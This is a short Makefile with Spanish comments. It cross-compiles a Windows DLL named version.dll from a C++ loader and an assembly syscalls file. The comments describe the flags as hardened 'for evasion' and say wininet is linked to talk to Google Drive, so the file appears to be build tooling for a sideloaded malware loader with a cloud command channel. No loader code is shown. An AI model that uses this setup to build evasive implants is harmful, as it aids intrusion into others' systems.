CXX = x86_64-w64-mingw32-g++
NASM = nasm

# Flags de Compilación Hardenizados para Evasión
CFLAGS = -O3 -s -mwindows -m64 -fno-asynchronous-unwind-tables \
         -fno-exceptions -fno-rtti -fmerge-all-constants \
         -fvisibility=hidden -ffunction-sections -fdata-sections \
         -I./src

# Flags de Linker para ASLR/DEP y Stripping
# NOTA: Añadido -lwininet para la comunicación con GDrive
LDFLAGS = -shared -static-libgcc -static-libstdc++ \
          -Wl,--strip-all -Wl,--discard-all \
          -Wl,--dynamicbase -Wl,--nxcompat \
          -Wl,--high-entropy-va -Wl,--subsystem,windows \
          -lwininet

SRC_FILES = src/loader.cpp
ASM_FILES = src/syscalls.asm
OBJ_FILES = bin/loader.o bin/syscalls.o

all: bin/version.dll

bin/loader.o: src/loader.cpp
	$(CXX) $(CFLAGS) -c $< -o $@

bin/syscalls.o: src/syscalls.asm
	$(NASM) -f win64 $< -o $@

bin/version.dll: $(OBJ_FILES)
	$(CXX) $(OBJ_FILES) $(LDFLAGS) -o $@

clean:
	rm -f bin/*.o bin/*.dll
